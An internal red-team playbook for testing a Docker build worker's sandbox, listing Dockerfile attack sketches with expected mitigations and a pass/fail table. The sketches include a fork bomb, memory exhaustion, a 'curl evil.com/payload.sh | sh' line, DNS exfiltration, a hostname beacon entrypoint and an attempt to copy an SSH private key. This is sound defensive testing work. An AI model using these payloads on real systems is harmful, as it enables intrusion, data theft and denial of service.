# Red-team playbook

For Week 13 of Q1. One-day exercise. Turns "try to break the build worker" into a checklist with expected behaviors, so the output is a clear pass-or-fail rather than a vibes-based conclusion.

## How to use this doc

Block one full day. Clear the calendar. No meetings, no Slack. The point is to adopt the adversary's mindset and stay in it.

For each attack below:

1. Read the scenario and the expected mitigation
2. Build the exploit Dockerfile or submission payload
3. Submit it through the real `/api/v1/submissions` path (your admin account, not a new test account — we want to hit the exact same flow real submitters hit)
4. Approve it in `/app/admin` as if you were a reviewer who missed the warning signs
5. Let the worker process it
6. Observe what happens, compare to the expected mitigation column
7. Mark pass / fail / partial in the results table at the bottom

Any **fail** or **partial** where the mitigation should have worked blocks public rollout. No exceptions. Trusted submitters only (a manual allowlist of ~5 people I know personally) until every mitigation passes.

## Pre-flight checklist

Before starting:

- [ ] Fresh Hetzner build host, nothing of value on it. If a test succeeds and compromises the host, we nuke it.
- [ ] No production database connection. The worker is pointed at a separate test Postgres.
- [ ] No real cosign keys. Use an expendable GitHub Actions OIDC identity; revoke afterward.
- [ ] Backup of the build host's disk image taken — if I brick the host, restore rather than reinstall.
- [ ] Instatus and Sentry are on and watching — real-user alerts from this day should be distinguishable from my testing.
- [ ] My phone is silenced; this is a focus day.

## The 14 attacks

Organized by what they target. Each one has a category, a rationale for why I'm testing it, the exploit sketch, and the expected behavior.

### Category A: resource exhaustion

These attacks don't try to escape the sandbox — they try to make the sandbox unusable for anyone else.

#### A1 — Huge base image

**Scenario:** submitter pulls a 40 GB base image, filling the build host's disk before anyone can react.

**Exploit:**
```dockerfile
FROM some-public/archive-ml-image:latest   # actually 40 GB
RUN echo "hi"
```

**Expected mitigation:** `--storage-opt size=20G` hits the cap during `docker pull`, build aborts with `no space left on device` equivalent, host disk usage stays under the per-build ceiling. Submission marked `status=failed`, submitter gets an email with the error.

**Fail state:** host fills up, other builds in the queue fail for unrelated reasons, worker crashes.

#### A2 — Infinite loop build

**Scenario:** submitter writes a `RUN` that loops forever, hogging CPU and blocking the worker.

**Exploit:**
```dockerfile
FROM alpine:3.19
RUN while true; do echo "hello"; done
```

**Expected mitigation:** `timeout 600` sends SIGTERM after 10 minutes, then SIGKILL after grace period. Submission marked `status=failed` with `buildErrorKind=system` and message "build exceeded 10-minute time limit." Next submission in queue picks up normally.

**Fail state:** worker blocks for hours, queue backs up, someone has to manually kill the build.

#### A3 — Fork bomb in `RUN`

**Scenario:** intentional process explosion during build.

**Exploit:**
```dockerfile
FROM alpine:3.19
RUN apk add --no-cache bash && \
    bash -c ':(){ :|:& };:'
```

**Expected mitigation:** `--pids-limit 1024` on `docker build` caps process count inside the build. Build fails with resource exhaustion, worker and host are unaffected.

**Note:** the spec didn't mention `--pids-limit`. Add it. This is exactly what red-teaming is for.

**Fail state:** host's PID table exhausts; system becomes unresponsive.

#### A4 — Memory balloon

**Scenario:** `RUN` allocates all available memory.

**Exploit:**
```dockerfile
FROM alpine:3.19
RUN apk add --no-cache python3 && \
    python3 -c "x=[]; exec('while True: x.append(\"x\"*10000000)')"
```

**Expected mitigation:** `--memory 4g --memory-swap 4g` caps at 4 GB, OOM killer kills the build process, Docker reports build failure, other builds unaffected.

**Fail state:** host swaps heavily, other services degrade.

### Category B: network egress

These attacks test whether `--network=none` is actually enforced.

#### B1 — Direct outbound during build

**Scenario:** try to contact an external host during `RUN`.

**Exploit:**
```dockerfile
FROM alpine:3.19
RUN apk add --no-cache curl && \
    curl https://example.com/ > /dev/null
```

**Expected mitigation:** `apk add curl` succeeds only if the base image has apk mirrors in network-none mode... wait, it doesn't. So the first `RUN` fails at `apk update`, which is the actual test. Confirm the error is specifically a network error, not something else.

**Fail state:** the `curl` runs, proving network isn't actually isolated.

#### B2 — DNS-based exfiltration

**Scenario:** even if TCP is blocked, DNS might leak. Encode data in DNS queries.

**Exploit:**
```dockerfile
FROM alpine:3.19
RUN getent hosts secret-data.evil.com
```

**Expected mitigation:** no DNS resolver configured in the network-none namespace; `getent` fails with no resolution. Even if a DNS resolver was somehow accessible, there's no route out of the namespace for the query.

**Fail state:** DNS query reaches the internet, attacker's DNS logs show the leak.

#### B3 — IPv6 bypass attempt

**Scenario:** sometimes network isolation is IPv4-only and IPv6 leaks.

**Exploit:**
```dockerfile
FROM alpine:3.19
RUN apk add --no-cache curl && curl -6 https://[2606:4700::1111]/
```

**Expected mitigation:** `--network=none` disables both IPv4 and IPv6 interfaces in the container namespace. No route out either way.

**Fail state:** IPv6 request succeeds where IPv4 was blocked.

#### B4 — Requires-network escape hatch abuse

**Scenario:** the opt-in `requiresNetwork=true` path shouldn't be a hole. Test it.

**Exploit:** submission with `requiresNetwork=true`, Dockerfile that contacts a non-whitelisted host.

```dockerfile
FROM alpine:3.19
RUN apk add --no-cache curl && \
    curl https://evil.com/payload.sh | sh
```

**Expected mitigation:** the constrained-network mode allows only whitelisted domains (npm registry, pypi, debian mirrors, handful of others). `evil.com` isn't on the list; the request fails at DNS or connect.

**Fail state:** whitelist is permissive enough that `evil.com` resolves, or the whitelist is accidentally bypassed entirely and it's just "normal internet."

### Category C: container escape

The biggest category. These test the actual isolation boundary.

#### C1 — Mount abuse

**Scenario:** try to mount something from the host into the build.

**Exploit:**
```dockerfile
FROM alpine:3.19
RUN --mount=type=bind,source=/etc,target=/host-etc ls /host-etc
```

**Expected mitigation:** `--mount=type=bind` with a source outside the build context is denied by Docker's buildkit in default mode. Build fails with "mount source must be within build context."

**Fail state:** we see `/etc/shadow` or similar host files readable in the build.

#### C2 — Privileged flag request

**Scenario:** Dockerfile asks for privileged mode.

Docker's `--privileged` is a build-time flag, not a Dockerfile directive, so this can't be set via Dockerfile. Test is: does the worker ever pass `--privileged` to `docker build`? (It shouldn't.)

**Expected mitigation:** grep the worker source for `--privileged`; it should be absent. No Dockerfile can opt into it.

**Fail state:** I find `--privileged` in the worker code.

#### C3 — userns-remap break

**Scenario:** verify userns-remap actually maps root→unprivileged.

**Exploit:** inside the build, try to do something only host-root can do.

```dockerfile
FROM alpine:3.19
RUN mkdir /foo && chown 0:0 /foo && echo "container uid: $(id -u)"
# In a Dockerfile RUN this always says uid=0 because the container's
# user namespace maps 0→0 internally. But on the HOST filesystem,
# any files created map to flareo-build's UID.
```

**Expected mitigation:** after the build, inspect the layer's actual file ownership on the host. Files owned by "root" (0) inside the container should be owned by `flareo-build` (e.g. 100000) on the host.

**Fail state:** files show up as host-root-owned. userns-remap isn't working.

#### C4 — CVE in specific Docker version

**Scenario:** check if the host Docker version has any known escape CVEs.

**Action:** not an exploit test; a check. Run `docker version`, compare to Docker security advisories, confirm patch level is current.

**Expected:** Docker at latest stable. If behind on patches, Week 10 triage missed this — fix before continuing red-team.

#### C5 — Build context access

**Scenario:** see if the build can access files outside the intended context.

**Exploit:**
```dockerfile
FROM alpine:3.19
COPY ../.ssh/id_rsa /loot
```

**Expected mitigation:** `COPY` with `..` in path fails at build-time. This is enforced by Docker; should just work.

**Fail state:** the file copy succeeds.

### Category D: built-image attacks

These don't break the build host — they poison the output image for downstream users.

#### D1 — Malicious entrypoint

**Scenario:** build succeeds; image runs malicious code when pulled by someone else.

**Exploit:**
```dockerfile
FROM alpine:3.19
RUN echo '#!/bin/sh
curl https://evil.com/beacon?host=$(hostname)' > /malware.sh
RUN chmod +x /malware.sh
ENTRYPOINT ["/malware.sh"]
```

**Expected mitigation:** Trivy's post-build scan flags the embedded shell script? Probably not — Trivy is CVE-oriented, not behavior-oriented. **This is a known gap.** The signature we apply says "Flareo built what upstream shipped"; it does NOT say "safe to run." Documented in the threat model and the user-facing docs.

**So this is not a failure of the worker.** It's a failure of our claim if we overclaim. Verify the docs don't overclaim.

**Action item from this attack:** ensure `/docs/threat-model` is explicit that a signature doesn't mean the image is safe to run. If the docs say otherwise, that's a docs bug to fix before public launch.

#### D2 — Known-CVE dependency

**Scenario:** Dockerfile pulls a dependency with a critical CVE.

**Exploit:**
```dockerfile
FROM node:16.0.0        # old Node with known CVEs
COPY . /app
WORKDIR /app
```

**Expected mitigation:** Trivy finds CRITICAL/HIGH CVEs in the node:16.0.0 base image, exits non-zero, worker marks submission `status=scan_rejected`. Submitter gets email with the list of CVEs.

**Fail state:** scan passes or is skipped.

#### D3 — Supply-chain registry manipulation

**Scenario:** Dockerfile references an image with a tag that the attacker controls on Docker Hub. Between submission and build, attacker swaps the image behind the tag.

**Exploit:** Dockerfile references `attacker/evil:latest`; attacker pushes a new image to that tag after the reviewer looked at the Dockerfile.

**Expected mitigation:** partial. We can't entirely prevent this — the reviewer saw the Dockerfile, not the resolved image contents. What mitigates:
- Trivy scans what was actually built, so a malicious payload still flags on scan
- We recommend (in the submission guide) pinning base images by digest: `FROM attacker/evil@sha256:...`
- Reviewer documentation says "check that all `FROM` lines pin by digest or point at well-known publisher namespaces"

**Fail state:** worker builds and publishes a malicious image because nothing caught the tag swap. Acceptable-failure state: reviewer follows their checklist and rejects un-pinned third-party tags.

#### D4 — Layer-level poisoning

**Scenario:** base image looks clean, but has a late layer that does something bad.

**Action:** this is D1 and D3 combined. No new test; test them both.

## Results table

Fill in as the day progresses. Goal: every row in "pass."

| ID  | Attack                            | Result     | Notes |
|-----|-----------------------------------|------------|-------|
| A1  | Huge base image                   | [ ] pass [ ] partial [ ] fail |  |
| A2  | Infinite loop build               | [ ] pass [ ] partial [ ] fail |  |
| A3  | Fork bomb                         | [ ] pass [ ] partial [ ] fail |  |
| A4  | Memory balloon                    | [ ] pass [ ] partial [ ] fail |  |
| B1  | Direct outbound                   | [ ] pass [ ] partial [ ] fail |  |
| B2  | DNS exfiltration                  | [ ] pass [ ] partial [ ] fail |  |
| B3  | IPv6 bypass                       | [ ] pass [ ] partial [ ] fail |  |
| B4  | Requires-network whitelist abuse  | [ ] pass [ ] partial [ ] fail |  |
| C1  | Mount abuse                       | [ ] pass [ ] partial [ ] fail |  |
| C2  | Privileged flag audit             | [ ] pass [ ] partial [ ] fail |  |
| C3  | userns-remap verification         | [ ] pass [ ] partial [ ] fail |  |
| C4  | Docker version CVE audit          | [ ] pass [ ] partial [ ] fail |  |
| C5  | Build context access              | [ ] pass [ ] partial [ ] fail |  |
| D1  | Malicious entrypoint (docs check) | [ ] pass [ ] partial [ ] fail |  |
| D2  | Known-CVE dependency              | [ ] pass [ ] partial [ ] fail |  |
| D3  | Supply-chain registry swap        | [ ] pass [ ] partial [ ] fail |  |

## Go / no-go decision

After the day:

**GO public:**
- All rows pass
- A writeup is published (internal: `security-posture.md`) summarizing what was tested and what the mitigations are

**NO-GO, trusted submitters only:**
- Any "fail" in categories A, B, or C. These are the worker's isolation guarantees; failing them means we can't trust arbitrary Dockerfiles.
- 2+ partial results in any category. Suggests something systemic rather than a one-off gap.

**Special case — category D:**
Partial results in D are acceptable *if and only if* the user-facing docs and the threat model are honest about the gap. Category D is about overclaiming safety, not about failing isolation. The correct response to D failures is documentation, not blocking the feature.

## What to do when something fails

Process:

1. Stop testing. Don't pile up failures.
2. Open a ticket with the exact exploit steps and the actual vs. expected behavior.
3. Fix the mitigation; re-test the specific failure.
4. Resume from where I left off.

If two different failures are found in a single category, stop entirely. That pattern suggests the category's whole approach needs rethinking, not just patching.

## Artifacts to publish after the day

- `security-posture.md` — internal doc listing what was tested, what passed, what's a known limitation. Lives in the repo, not public.
- Updates to `/docs/threat-model` if the test revealed an overclaim we should correct.
- Updates to `build-worker-spec.md` if I discovered a mitigation that wasn't in the original spec (I noted this with `--pids-limit` already; there will be others).
- A short private note to paying customers (when they exist) explaining the security posture. Trust builds from transparency, not from marketing copy.

## Follow-up schedule

Red-team is not a one-time event. Repeat:

- **Immediately after any worker code change touching sandboxing** — re-run the relevant category
- **Every 3 months** — full re-run, including new attacks based on whatever's been published in container-escape CVEs since the last run
- **Opportunistically** — if a new class of attack is published (e.g. a novel userns escape CVE), add it to the playbook and run it

## One closing note

The point of this playbook isn't to prove the system is unbreakable. It's to force specific, reproducible tests of specific, nameable threats. When a real incident happens — and one will eventually — the question the playbook answers is "did we think about this class of attack?" A playbook that says "yes, and here's what we tested" is a much better position than one that says "we tried to make it secure."

A system you haven't tried to break is a system you don't understand.
